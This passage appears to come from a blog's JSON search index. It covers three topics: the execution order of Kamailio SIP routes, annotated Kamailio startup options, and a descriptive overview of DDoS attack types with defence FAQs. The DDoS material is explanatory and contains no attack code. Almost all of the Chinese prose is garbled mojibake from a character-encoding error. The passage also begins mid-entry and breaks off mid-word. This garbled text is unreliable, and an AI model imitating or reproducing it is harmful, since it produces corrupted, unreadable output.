ç›´æ¥è¿”å›çŠ¶æ€ç ï¼Œä¸åšè½¬å‘ï¼Œä¾‹å¦‚ç›´æ¥è¿”å›301é‡å®šå‘ æ— çŠ¶æ€è½¬å‘ æœ‰çŠ¶æ€è½¬å‘ æ‰§è¡Œåˆ†æ”¯è·¯ç”±ï¼Œåˆ†æ”¯è·¯ç”±ä¹Ÿå¯ä»¥å°†æ¶ˆæ¯ä¸¢å¼ƒ æ— è®ºæœ‰æ— çŠ¶æ€ï¼Œè¯·æ±‚å‘å‡ºå»å‰éƒ½ä¼šæ‰§è¡Œonsend_routeè·¯ç”±ï¼Œåœ¨onsend_routeå†…éƒ¨ï¼Œå·²ç»ä¸èƒ½å¯¹SIPæ¶ˆæ¯å†åšæ‹¦æˆª 2. å“åº”æ¶ˆæ¯å¤„ç†è¿‡ç¨‹ é¦–å…ˆæ‰§è¡Œreply_route{}, åœ¨è¿™ä¸ªè·¯ç”±é‡Œå¯ä»¥å°†æ¶ˆæ¯ä¸¢å¼ƒ ç„¶ååˆ¤æ–­æ¶ˆæ¯æ˜¯å¦æœ‰çŠ¶æ€çš„ æœ‰çŠ¶æ€ï¼Œè¿™æ‰§è¡Œonreply_route[ID]è·¯ç”± å¦‚æœå“åº”æ˜¯å¤±è´¥çš„ï¼Œè¿˜å¯ä»¥æ‰§è¡Œfailure_route[ID], å½“å‰å‰ææ˜¯åœ¨è¯·æ±‚è·¯ç”±é‡Œæ˜¯å¦è®¾ç½®äº†é’©å­ åœ¨å¤±è´¥è·¯ç”±å¯ä»¥ï¼Œå¯ä»¥å†æ¬¡è®¾ç½®æ–°çš„ç›®æ ‡åœ°å€ï¼Œè¿›è¡Œè½¬å‘ï¼› è®¾ç½®äº†æ–°çš„ç›®æ ‡åœ°å€åï¼Œè¿˜å¯ä»¥è®¾ç½®åˆ†æ”¯è·¯ç”± Tip è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œå“åº”è·¯ç”±åœ¨å¤±è´¥è·¯ç”±ä¹‹å‰æ‰§è¡Œã€‚ 3. é‡ä¼ å¤„ç† ","permalink":"https://wdd.js.org/kamailio/msg-flow/","summary":"1. è¯·æ±‚æ¶ˆæ¯å¤„ç†è¿‡ç¨‹ è¯·æ±‚å¯ä»¥\nç›´æ¥ä¸¢å¼ƒï¼Œä¸è¿”å›ä»»ä½•å“åº”ã€‚å¯¹äºæ¶æ„è¯·æ±‚ï¼ŒSIP Floodæ”»å‡»ï¼Œæœ€å¥½ä¸è¦è¿”å›ä»»ä½•å“åº”ã€‚ ç›´æ¥è¿”å›çŠ¶æ€ç ï¼Œä¸åšè½¬å‘ï¼Œä¾‹å¦‚ç›´æ¥è¿”å›301é‡å®šå‘ æ— çŠ¶æ€è½¬å‘ æœ‰çŠ¶æ€è½¬å‘ æ‰§è¡Œåˆ†æ”¯è·¯ç”±ï¼Œåˆ†æ”¯è·¯ç”±ä¹Ÿå¯ä»¥å°†æ¶ˆæ¯ä¸¢å¼ƒ æ— è®ºæœ‰æ— çŠ¶æ€ï¼Œè¯·æ±‚å‘å‡ºå»å‰éƒ½ä¼šæ‰§è¡Œonsend_routeè·¯ç”±ï¼Œåœ¨onsend_routeå†…éƒ¨ï¼Œå·²ç»ä¸èƒ½å¯¹SIPæ¶ˆæ¯å†åšæ‹¦æˆª 2. å“åº”æ¶ˆæ¯å¤„ç†è¿‡ç¨‹ é¦–å…ˆæ‰§è¡Œreply_route{}, åœ¨è¿™ä¸ªè·¯ç”±é‡Œå¯ä»¥å°†æ¶ˆæ¯ä¸¢å¼ƒ ç„¶ååˆ¤æ–­æ¶ˆæ¯æ˜¯å¦æœ‰çŠ¶æ€çš„ æœ‰çŠ¶æ€ï¼Œè¿™æ‰§è¡Œonreply_route[ID]è·¯ç”± å¦‚æœå“åº”æ˜¯å¤±è´¥çš„ï¼Œè¿˜å¯ä»¥æ‰§è¡Œfailure_route[ID], å½“å‰å‰ææ˜¯åœ¨è¯·æ±‚è·¯ç”±é‡Œæ˜¯å¦è®¾ç½®äº†é’©å­ åœ¨å¤±è´¥è·¯ç”±å¯ä»¥ï¼Œå¯ä»¥å†æ¬¡è®¾ç½®æ–°çš„ç›®æ ‡åœ°å€ï¼Œè¿›è¡Œè½¬å‘ï¼› è®¾ç½®äº†æ–°çš„ç›®æ ‡åœ°å€åï¼Œè¿˜å¯ä»¥è®¾ç½®åˆ†æ”¯è·¯ç”± Tip è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œå“åº”è·¯ç”±åœ¨å¤±è´¥è·¯ç”±ä¹‹å‰æ‰§è¡Œã€‚ 3. é‡ä¼ å¤„ç† ","title":"è·¯ç”±æ‰§è¡Œçš„é¡ºåº"},{"content":" -a mode Auto aliases mode: enable with yes or on, disable with no or off ä¸€èˆ¬éƒ½æ˜¯å…³é—­ --alias=val Add an alias, the value has to be \u0026#39;[proto:]hostname[:port]\u0026#39; (like for \u0026#39;alias\u0026#39; global parameter) è®¾ç½®å¯¹å¤–åˆ«å, åœ¨å¤šä¸ªå¯¹å¤–åˆ«åæ—¶ï¼Œç›¸æ¯”äºåœ¨è„šæœ¬ä¸­å†™æ­», æ›´å¥½çš„æ–¹å¼ æ˜¯åœ¨å¯åŠ¨æ—¶ä¼ å…¥, aliasä¸€èˆ¬éƒ½æ˜¯æœåŠ¡çš„å¯¹å¤–åŸŸåæˆ–è€…IP å¦‚æœkmæœ‰å¤šä¸ªå¯¹å¤–åŸŸåï¼Œå¹¶ä¸”ä¸åŒçš„ç¯å¢ƒéƒ½ä¸åŒï¼Œè¿™å—é…ç½®å°±åˆé€‚åœ¨è„šæœ¬é‡Œå†™æ­» --atexit=val Control atexit callbacks execution from external libraries which may access destroyed shm memory causing crash on shutdown. Can be y[es] or 1 to enable atexit callbacks, n[o] or 0 to disable, default is no. æ²¡ç”¨è¿‡ -A define Add config pre-processor define (e.g., -A WITH_AUTH, -A \u0026#39;FLT_ACC=1\u0026#39;, -A \u0026#39;DEFVAL=\u0026#34;str-val\u0026#34;\u0026#39;) é¢„å¤„ç†çš„å˜é‡å®šä¹‰ -b nr Maximum OS UDP receive buffer size which will not be exceeded by auto-probing-and-increase procedure even if OS allows -B nr Maximum OS UDP send buffer size which will not be exceeded by auto-probing-and-increase procedure even if OS allows è¿™å’Œä¸Šé¢çš„æœ‰å•¥åŒºåˆ«å‘¢ï¼Ÿ -c Check configuration file for syntax errors å¯ä»¥æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•é”™è¯¯ã€‚å¦‚æœè¿™ä¸ªé€‰é¡¹å¼€å¯ï¼Œå°±åªèƒ½åšæ£€æŸ¥è¯­æ³•ï¼Œè€Œä¸èƒ½å¯åŠ¨kama --cfg-print Print configuration file evaluating includes and ifdefs åœ¨è„šæœ¬é‡Œæœ‰å¾ˆå¤šé¢„å¤„ç†æŒ‡ä»¤æ—¶ï¼Œå¯ä»¥ç”¨è¿™ä¸ªå‚æ•°æ‰“å°å‡ºé¢„å¤„ç†ä¹‹åçš„è„šæœ¬ -d Debugging level control (multiple -d to increase the level from 0) è°ƒè¯•ç•Œåˆ« --debug=val Debugging level value -D Control how daemonize is done: -D..do not fork (almost) anyway; -DD..do not daemonize creator; -DDD..daemonize (default) æ§åˆ¶æ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹ -e Log messages printed in terminal colors (requires -E) -E Log to stderr -f file Configuration file (default: /usr/local/etc/kamailio/kamailio.cfg) è®¾ç½®é…ç½®æ–‡ä»¶çš„ä½ç½®, å¯ä»¥è¦†ç›–é»˜è®¤çš„ä½ç½® -g gid Change gid (group id) -G file Create a pgid file -h This help message --help Long option for `-h` -I Print more internal compile flags and options -K Turn on \u0026#34;via:\u0026#34; host checking when forwarding replies -l address Listen on the specified address/interface (multiple -l mean listening on more addresses). The address format is [proto:]addr_lst[:port][/advaddr][/socket_name], where proto=udp|tcp|tls|sctp, addr_lst= addr|(addr, addr_lst), addr=host|ip_address|interface_name, advaddr=addr[:port] (advertised address) and socket_name=identifying name. E.g: -l localhost, -l udp:127.0.0.1:5080, -l eth0:5062, -l udp:127.0.0.1:5080/1.2.3.4:5060, -l udp:127.0.0.1:5080//local, -l udp:127.0.0.1:5080/1.2.3.4:5060/local, -l \u0026#34;sctp:(eth0)\u0026#34;, -l \u0026#34;(eth0, eth1, 127.0.0.1):5065\u0026#34;. The default behaviour is to listen on all the interfaces. æ§åˆ¶listençš„åœ°å€ --loadmodule=name load the module specified by name --log-engine=log engine name and data -L path Modules search path (default: /usr/local/lib64/kamailio/modules) -m nr Size of shared memory allocated in Megabytes å…±äº«å†…å­˜çš„å¤§å°è®¾ç½® --modparam=modname:paramname:type:value set the module parameter type has to be \u0026#39;s\u0026#39; for string value and \u0026#39;i\u0026#39; for int value, example: --modparam=corex:alias_subdomains:s:kamailio.org è®¾ç½®æ¨¡å—çš„å¯åŠ¨å‚æ•° å¯¹äºä¸æ–¹ä¾¿åœ¨è„šæœ¬é‡Œå†™æ­»çš„æ¨¡å—å‚æ•°ï¼Œè¿™ä¸ªæ–¹å¼ä¹ŸæŒºå¥½ç”¨ --all-errors Print details about all config errors that can be detected è°ƒè¯•æ¨¡å¼æ¯”è¾ƒå¥½ç”¨ï¼Œæ‰“å°è¯¦ç»†çš„æ—¥å¿—æŠ¥é”™ -M nr Size of private memory allocated, in Megabytes æ§åˆ¶ç§æœ‰å†…å­˜çš„å¤§å° -n processes Number of child processes to fork per interface (default: 8) -N Number of tcp child processes (default: equal to `-n\u0026#39;) -O nr Script optimization level (debugging option) -P file Create a pid file -Q Number of sctp child processes (default: equal to `-n\u0026#39;) -r Use dns to check if is necessary to add a \u0026#34;received=\u0026#34; field to a via -R Same as `-r` but use reverse dns; (to use both use `-rR`) --server-id=num set the value for server_id --subst=exp set a subst preprocessor directive --substdef=exp set a substdef preprocessor directive --substdefs=exp set a substdefs preprocessor directive -S disable sctp -t dir Chroot to \u0026#34;dir\u0026#34; -T Disable tcp -u uid Change uid (user id) -v Version number --version Long option for `-v` -V Alternative for `-v` -x name Specify internal manager for shared memory (shm) - can be: fm, qm or tlsf -X name Specify internal manager for private memory (pkg) - if omitted, the one for shm is used -Y dir Runtime dir path -w dir Change the working directory to \u0026#34;dir\u0026#34; (default: \u0026#34;/\u0026#34;) -W type poll method (depending on support in OS, it can be: poll, epoll_lt, epoll_et, sigio_rt, select, kqueue, /dev/poll) ","permalink":"https://wdd.js.org/kamailio/kamailio-cli-params/","summary":"-a mode Auto aliases mode: enable with yes or on, disable with no or off ä¸€èˆ¬éƒ½æ˜¯å…³é—­ --alias=val Add an alias, the value has to be \u0026#39;[proto:]hostname[:port]\u0026#39; (like for \u0026#39;alias\u0026#39; global parameter) è®¾ç½®å¯¹å¤–åˆ«å, åœ¨å¤šä¸ªå¯¹å¤–åˆ«åæ—¶ï¼Œç›¸æ¯”äºåœ¨è„šæœ¬ä¸­å†™æ­», æ›´å¥½çš„æ–¹å¼ æ˜¯åœ¨å¯åŠ¨æ—¶ä¼ å…¥, aliasä¸€èˆ¬éƒ½æ˜¯æœåŠ¡çš„å¯¹å¤–åŸŸåæˆ–è€…IP å¦‚æœkmæœ‰å¤šä¸ªå¯¹å¤–åŸŸåï¼Œå¹¶ä¸”ä¸åŒçš„ç¯å¢ƒéƒ½ä¸åŒï¼Œè¿™å—é…ç½®å°±åˆé€‚åœ¨è„šæœ¬é‡Œå†™æ­» --atexit=val Control atexit callbacks execution from external libraries which may access destroyed shm memory causing crash on shutdown. Can be y[es] or 1 to enable atexit callbacks, n[o] or 0 to disable, default is no.","title":"kamailio å¯åŠ¨å‚æ•°æ§åˆ¶"},{"content":"æ”»å‡»åˆ†ç±» ç½‘ç»œå±‚\nICMP Floodæ”»å‡»: ICMPï¼ˆInternet Control Message Protocolï¼Œå› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰æ˜¯TCP/IPåè®®æ—çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚ICMPåè®®æœ¬èº«ç‰¹ç‚¹å†³å®šäº†å®ƒéå¸¸å®¹æ˜“è¢«ç”¨äºæ”»å‡»ç½‘ç»œä¸Šçš„è·¯ç”±å™¨å’Œä¸»æœºã€‚å½“æ”»å‡»è€…å‘ç›®æ ‡ç½‘ç»œå‘é€å¤§é‡çš„ICMPæ•°æ®åŒ…æ—¶ï¼Œç›®æ ‡ä¸»æœºä¼šè€—è´¹å¤§é‡çš„CPUèµ„æºå»å¤„ç†å’Œå“åº”ï¼Œç›´è‡³è€—å°½è®¾å¤‡èµ„æºï¼Œæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æ­£å¸¸æœåŠ¡ã€‚ ARP Floodæ”»å‡»: ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰æ˜¯ç”¨æ¥å°†IPåœ°å€è§£æä¸ºMACåœ°å€çš„åè®®ã€‚ARPåè®®ä¸»è¦ä»¥å¹¿æ’­çš„æ–¹å¼å‘é€ARPè¯·æ±‚ã€‚åŒç½‘æ®µå†…çš„ä¸»æœºéƒ½å¯ä»¥æ”¶åˆ°å¹¿æ’­è¯·æ±‚ï¼Œè¿™ä¸ºæ”»å‡»è€…æä¾›äº†å¯ä¹˜ä¹‹æœºã€‚æ”»å‡»è€…é€šè¿‡å‘é€å¤§é‡çš„ARPè¯·æ±‚ï¼Œä½¿æœ‰é™çš„ç½‘ç»œèµ„æºè¢«æ— ç”¨çš„å¹¿æ’­ä¿¡æ¯æ‰€å ç”¨ï¼Œé€ æˆç½‘ç»œæ‹¥å µã€‚å…¶æ¬¡ï¼Œå› ä¸ºARPåè®®æ²¡æœ‰å®‰å…¨è®¤è¯æœºåˆ¶ï¼Œæ‰€ä»¥åªè¦ä¸»æœºæ¥æ”¶åˆ°ARPåº”ç­”åŒ…ï¼Œéƒ½ä¼šç¼“å­˜åœ¨ARPè¡¨ä¸­ï¼Œè¿™ä¸ºARPæ¬ºéª—æä¾›äº†å¯èƒ½ã€‚ IPåˆ†ç‰‡æ”»å‡»: IPåè®®åœ¨ä¼ è¾“æ•°æ®åŒ…æ—¶ï¼Œä¼šå°†æ•°æ®æŠ¥æ–‡åˆ†ä¸ºè‹¥å¹²åˆ†ç‰‡è¿›è¡Œä¼ è¾“ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸­è¿›è¡Œé‡ç»„ã€‚IPåˆ†ç‰‡æ˜¯ç½‘ç»œç¯å¢ƒä¸­ç»å¸¸å‘ç”Ÿçš„äº‹ä»¶ï¼Œä½†æ˜¯ï¼Œå¦‚æœæ•°æ®è¢«äººä¸ºæ¶æ„åˆ†ç‰‡å°±ä¼šäº§ç”ŸDDoSæ”»å‡»ã€‚æ”»å‡»è€…å°†ç»è¿‡æ¶æ„åˆ†æ®µçš„æ•°æ®åŒ…å‘é€è‡³ç›®æ ‡ç½‘ç»œï¼Œå¯¼è‡´ç›®æ ‡ç½‘ç»œè€—è´¹å¤§é‡èµ„æºè¿›è¡Œé‡ç»„ï¼Œç›´è‡³èµ„æºæ¯ç«­ã€‚ ä¼ è¾“å±‚æ”»å‡»\nSYN Floodæ”»å‡»: SYN Floodæ˜¯äº’è”ç½‘æœ€åŸå§‹ã€æœ€ç»å…¸çš„DDoSæ”»å‡»ä¹‹ä¸€ï¼Œä¸»è¦åˆ©ç”¨äº†TCPåè®®çš„ä¸‰æ¬¡æ¡æ‰‹æœºåˆ¶ã€‚æ”»å‡»è€…é€šå¸¸åˆ©ç”¨å·¥å…·æˆ–æ§åˆ¶åƒµå°¸ä¸»æœºå‘æœåŠ¡å™¨å‘é€æµ·é‡çš„å˜æºIPåœ°å€æˆ–å˜æºç«¯å£çš„SYNæŠ¥æ–‡ï¼ŒæœåŠ¡å™¨å“åº”æŠ¥æ–‡åäº§ç”Ÿå¤§é‡çš„åŠè¿æ¥ï¼Œç›´è‡³ç³»ç»Ÿèµ„æºè¢«è€—å°½ï¼ŒæœåŠ¡å™¨æ— æ³•æä¾›æ­£å¸¸çš„æœåŠ¡ã€‚ ACK Floodæ”»å‡»: æ”»å‡»è€…é€šè¿‡åƒµå°¸ç½‘ç»œå‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡çš„ACKæŠ¥æ–‡ï¼ŒæŠ¥æ–‡å¸¦æœ‰è¶…å¤§è½½è·ï¼Œä¼šå¼•èµ·é“¾è·¯æ‹¥å¡ã€‚æˆ–å‘ç›®æ ‡æœåŠ¡å™¨å‘é€æé«˜é€Ÿç‡çš„å˜æºå˜ç«¯å£è¯·æ±‚ï¼Œå¯¼è‡´è½¬å‘è®¾å¤‡å¼‚å¸¸ï¼Œä»è€Œå¼•èµ·ç½‘ç»œç˜«ç—ªã€‚ UDP Floodæ”»å‡»: UDP Floodæ”»å‡»å¸¸ç”¨äºå¤§å¸¦å®½DDoSæ”»å‡»ã€‚æ”»å‡»è€…ä½¿ç”¨åŒ…å«æ— çŠ¶æ€UDPåè®®çš„IPæ•°æ®åŒ…å……å¡ç›®æ ‡ä¸»æœºçš„ç«¯å£ï¼Œå—å®³ä¸»æœºä¼šå¯»æ‰¾ä¸UDPæ•°æ®åŒ…ç›¸å…³çš„åº”ç”¨ç¨‹åºã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å‘å‘é€è€…å›å‘ä¸€æ¡â€œç›®æ ‡ä¸å¯è¾¾â€æ¶ˆæ¯ã€‚ä¸€æ—¦ç›®æ ‡ä¸»æœºè¢«æ”»å‡»æµé‡æ·¹æ²¡ï¼Œç³»ç»Ÿå°±ä¼šå¤±å»å“åº”ï¼Œä»è€Œé€ æˆåˆæ³•ç”¨æˆ·æ— æ³•æ­£å¸¸è®¿é—®çš„ç°è±¡ã€‚ åº”ç”¨å±‚æ”»å‡»\nDNS Floodæ”»å‡»: æ”»å‡»è€…é€šè¿‡æ“çºµå¤§é‡å‚€å„¡æœºå™¨ï¼Œå¯¹ç›®æ ‡ç½‘ç»œå‘èµ·æµ·é‡åŸŸåæŸ¥è¯¢è¯·æ±‚ï¼Œä»¥ä¸­æ–­è¯¥åŸŸçš„DNSè§£æã€‚è¿™ç§æ”»å‡»å°†ä¼šç ´åç½‘ç«™ã€APIæˆ–Webåº”ç”¨ç¨‹åºå“åº”åˆæ³•æµé‡çš„èƒ½åŠ›ï¼Œè®©åˆæ³•ç”¨æˆ·æ— æ³•æŸ¥æ‰¾åˆ°ç”¨äºè°ƒç”¨ç‰¹å®šèµ„æºçš„åœ°å€ï¼Œå¯¼è‡´ä¸šåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ã€‚ HTTP Floodæ”»å‡»: HTTP GET æ”»å‡»ï¼šæ”»å‡»è€…æ“æ§å¤šå°è®¾å¤‡å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¯¹å›¾åƒã€æ–‡ä»¶æˆ–å…¶ä»–èµ„äº§è¯·æ±‚ï¼Œå½“ç›®æ ‡æœåŠ¡å™¨è¢«ä¼ å…¥è¯·æ±‚å’Œå“åº”æ‰€æ·¹æ²¡æ—¶ï¼Œæ¥è‡ªæ­£å¸¸æµé‡æºçš„ä¸šåŠ¡è¯·æ±‚ä¹Ÿå°†è¢«æ‹’ç»ã€‚ HTTP POST æ”»å‡»ï¼šä¸å‘é€ POST è¯·æ±‚æ‰€éœ€çš„å¤„ç†èƒ½åŠ›å’Œå¸¦å®½ç›¸æ¯”ï¼Œå¤„ç†è¡¨å•æ•°æ®å’Œè¿è¡Œå¿…è¦æ•°æ®åº“å‘½ä»¤çš„è¿‡ç¨‹ç›¸å¯¹å¯†é›†ã€‚è¿™ç§æ”»å‡»åˆ©ç”¨ç›¸å¯¹èµ„æºæ¶ˆè€—çš„å·®å¼‚ï¼Œç›´æ¥å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡POSTè¯·æ±‚ï¼Œç›´è‡³ç›®æ ‡æœåŠ¡å™¨å®¹é‡é¥±å’Œå¹¶æ‹’ç»æœåŠ¡ä¸ºæ­¢ã€‚ CCæ”»å‡»: CCæ”»å‡»å¸¸ç”¨äºæ”»å‡»æä¾›ç½‘é¡µè®¿é—®æœåŠ¡çš„æœåŠ¡å™¨ã€‚æ”»å‡»è€…é€šè¿‡ä»£ç†æœåŠ¡å™¨å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡è²Œä¼¼åˆæ³•çš„è¯·æ±‚ï¼Œä½¿CPUé•¿æ—¶é—´å¤„äºé«˜è´Ÿè·è¿è¡ŒçŠ¶æ€ï¼Œæ°¸è¿œéƒ½æœ‰å¤„ç†ä¸å®Œçš„è¿æ¥ã€‚æ”»å‡»ä¼šå¯¼è‡´æ­£å¸¸è®¿é—®è¢«ä¸­æ­¢ï¼Œæœ€ç»ˆå®•æœºå´©æºƒã€‚ SIPæ³¨å†Œ Floodæ”»å‡»: æ”»å‡»è€…å‘é€å¤§é‡çš„SIPæ³¨å†Œè¯·æ±‚åˆ°SIPæœåŠ¡ç«¯ï¼ŒSIPæœåŠ¡å™¨éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œæ‹–æ…¢æ­£å¸¸çš„æ•°æ®åº“æŸ¥è¯¢ï¼Œä¹Ÿå›å ç”¨å¤§é‡çš„èµ„æºæ¥ç»´æŠ¤æ³¨å†Œçš„äº‹åŠ¡ã€‚ FAQ é˜²ç«å¢™èƒ½å¦æ‹¦æˆªDDOSæ”»å‡»ï¼Ÿ æ‹¦æˆªä¸äº†ï¼Œé˜²ç«å¢™å°±å¥½æ¯”é¥­åº—çš„ä¿å®‰ï¼Œä¿å®‰å†å¤šï¼Œä½†æ˜¯é¥­åº—é—¨å£é“è·¯äº¤é€šå µå¡äº†ï¼Œé¥­åº—çš„è¥ä¸šé¢ä¸‹é™ï¼Œå†å¤šçš„ä¿å®‰ä¹Ÿæ— èƒ½ä¸ºåŠ› åœ¨é­å—DDOSæ”»å‡»åï¼Œç”¨ä»€ä¹ˆæ‰‹æ®µé˜²å¾¡ï¼Ÿ è´­ä¹°ç¡¬ä»¶è®¾å¤‡ï¼šé™¤äº†æ¯”è¾ƒè´µä¹‹å¤–ï¼Œå¯¹äºä½¿ç”¨äº‘æœåŠ¡å™¨çš„æœåŠ¡ä¹Ÿæ— èƒ½ä¸ºåŠ› æ›´æ¢å…¬ç½‘IPï¼šå¯¹äºä½¿ç”¨äº‘æœåŠ¡å™¨æ¥è¯´ï¼Œæ›´æ¢äº‘æœåŠ¡å™¨çš„å…¬ç½‘IPçœ‹èµ·æ¥æ¯”è¾ƒç®€å•æ–¹ä¾¿ã€‚ä½†æ˜¯ä¹Ÿæœ‰éº»çƒ¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚è‡ªå·±çš„æœåŠ¡å¯èƒ½è¦æ¶‰åŠåˆ°é…ç½®æ”¹å˜å’ŒæœåŠ¡é‡å¯ï¼Œå’Œè‡ªå·±ç›¸å…³çš„ç¬¬ä¸‰æ–¹ï¼Œä¹Ÿå¯èƒ½è¦ä¿®æ”¹IPçš„è®¿é—®åœ°å€ ä½¿ç”¨äº‘æœåŠ¡å‚å•†æä¾›çš„DDOSæœåŠ¡ å¦‚ä½•æ„ŸçŸ¥åˆ°è‡ªå·±çš„æœåŠ¡æ­£åœ¨é­å—DDOSæ”»å‡»ï¼Ÿ å¼‚å¸¸å¤§çš„æµé‡æ³¢åŠ¨ æ­£å¸¸ç”¨æˆ·å¤§é‡ç¦»çº¿ å‚è€ƒ https://info.support.huawei.com/info-finder/encyclopedia/zh/DDoS%E6%94%BB%E5%87%BB.html https://www.microsoft.com/zh-cn/security/business/security-101/what-is-a-ddos-attack ","permalink":"https://wdd.js.org/posts/2024/ddos/","summary":"æ”»å‡»åˆ†ç±» ç½‘ç»œå±‚\nICMP Floodæ”»å‡»: ICMPï¼ˆInternet Control Message Protocolï¼Œå› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰æ˜¯TCP/IPåè®®æ—çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚ICMPåè®®æœ¬èº«ç‰¹ç‚¹å†³å®šäº†å®ƒéå¸¸å®¹æ˜“è¢«ç”¨äºæ”»å‡»ç½‘ç»œä¸Šçš„è·¯ç”±å™¨å’Œä¸»æœºã€‚å½“æ”»å‡»è€…å‘ç›®æ ‡ç½‘ç»œå‘é€å¤§é‡çš„ICMPæ•°æ®åŒ…æ—¶ï¼Œç›®æ ‡ä¸»æœºä¼šè€—è´¹å¤§é‡çš„CPUèµ„æºå»å¤„ç†å’Œå“åº”ï¼Œç›´è‡³è€—å°½è®¾å¤‡èµ„æºï¼Œæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æ­£å¸¸æœåŠ¡ã€‚ ARP Floodæ”»å‡»: ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰æ˜¯ç”¨æ¥å°†IPåœ°å€è§£æä¸ºMACåœ°å€çš„åè®®ã€‚ARPåè®®ä¸»è¦ä»¥å¹¿æ’­çš„æ–¹å¼å‘é€ARPè¯·æ±‚ã€‚åŒç½‘æ®µå†…çš„ä¸»æœºéƒ½å¯ä»¥æ”¶åˆ°å¹¿æ’­è¯·æ±‚ï¼Œè¿™ä¸ºæ”»å‡»è€…æä¾›äº†å¯ä¹˜ä¹‹æœºã€‚æ”»å‡»è€…é€šè¿‡å‘é€å¤§é‡çš„ARPè¯·æ±‚ï¼Œä½¿æœ‰é™çš„ç½‘ç»œèµ„æºè¢«æ— ç”¨çš„å¹¿æ’­ä¿¡æ¯æ‰€å ç”¨ï¼Œé€ æˆç½‘ç»œæ‹¥å µã€‚å…¶æ¬¡ï¼Œå› ä¸ºARPåè®®æ²¡æœ‰å®‰å…¨è®¤è¯æœºåˆ¶ï¼Œæ‰€ä»¥åªè¦ä¸»æœºæ¥æ”¶åˆ°ARPåº”ç­”åŒ…ï¼Œéƒ½ä¼šç¼“å­˜åœ¨ARPè¡¨ä¸­ï¼Œè¿™ä¸ºARPæ¬ºéª—æä¾›äº†å¯èƒ½ã€‚ IPåˆ†ç‰‡æ”»å‡»: IPåè®®åœ¨ä¼ è¾“æ•°æ®åŒ…æ—¶ï¼Œä¼šå°†æ•°æ®æŠ¥æ–‡åˆ†ä¸ºè‹¥å¹²åˆ†ç‰‡è¿›è¡Œä¼ è¾“ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸­è¿›è¡Œé‡ç»„ã€‚IPåˆ†ç‰‡æ˜¯ç½‘ç»œç¯å¢ƒä¸­ç»å¸¸å‘ç”Ÿçš„äº‹ä»¶ï¼Œä½†æ˜¯ï¼Œå¦‚æœæ•°æ®è¢«äººä¸ºæ¶æ„åˆ†ç‰‡å°±ä¼šäº§ç”ŸDDoSæ”»å‡»ã€‚æ”»å‡»è€…å°†ç»è¿‡æ¶æ„åˆ†æ®µçš„æ•°æ®åŒ…å‘é€è‡³ç›®æ ‡ç½‘ç»œï¼Œå¯¼è‡´ç›®æ ‡ç½‘ç»œè€—è´¹å¤§é‡èµ„æºè¿›è¡Œé‡ç»„ï¼Œç›´è‡³èµ„æºæ¯ç«­ã€‚ ä¼ è¾“å±‚æ”»å‡»\nSYN Floodæ”»å‡»: SYN Floodæ˜¯äº’è”ç½‘æœ€åŸå§‹ã€æœ€ç»å…¸çš„DDoSæ”»å‡»ä¹‹ä¸€ï¼Œä¸»è¦åˆ©ç”¨äº†TCPåè®®çš„ä¸‰æ¬¡æ¡æ‰‹æœºåˆ¶ã€‚æ”»å‡»è€…é€šå¸¸åˆ©ç”¨å·¥å…·æˆ–æ§åˆ¶åƒµå°¸ä¸»æœºå‘æœåŠ¡å™¨å‘é€æµ·é‡çš„å˜æºIPåœ°å€æˆ–å˜æºç«¯å£çš„SYNæŠ¥æ–‡ï¼ŒæœåŠ¡å™¨å“åº”æŠ¥æ–‡åäº§ç”Ÿå¤§é‡çš„åŠè¿æ¥ï¼Œç›´è‡³ç³»ç»Ÿèµ„æºè¢«è€—å°½ï¼ŒæœåŠ¡å™¨æ— æ³•æä¾›æ­£å¸¸çš„æœåŠ¡ã€‚ ACK Floodæ”»å‡»: æ”»å‡»è€…é€šè¿‡åƒµå°¸ç½‘ç»œå‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡çš„ACKæŠ¥æ–‡ï¼ŒæŠ¥æ–‡å¸¦æœ‰è¶…å¤§è½½è·ï¼Œä¼šå¼•èµ·é“¾è·¯æ‹¥å¡ã€‚æˆ–å‘ç›®æ ‡æœåŠ¡å™¨å‘é€æé«˜é€Ÿç‡çš„å˜æºå˜ç«¯å£è¯·æ±‚ï¼Œå¯¼è‡´è½¬å‘è®¾å¤‡å¼‚å¸¸ï¼Œä»è€Œå¼•èµ·ç½‘ç»œç˜«ç—ªã€‚ UDP Floodæ”»å‡»: UDP Floodæ”»å‡»å¸¸ç”¨äºå¤§å¸¦å®½DDoSæ”»å‡»ã€‚æ”»å‡»è€…ä½¿ç”¨åŒ…å«æ— çŠ¶æ€UDPåè®®çš„IPæ•°æ®åŒ…å……å¡ç›®æ 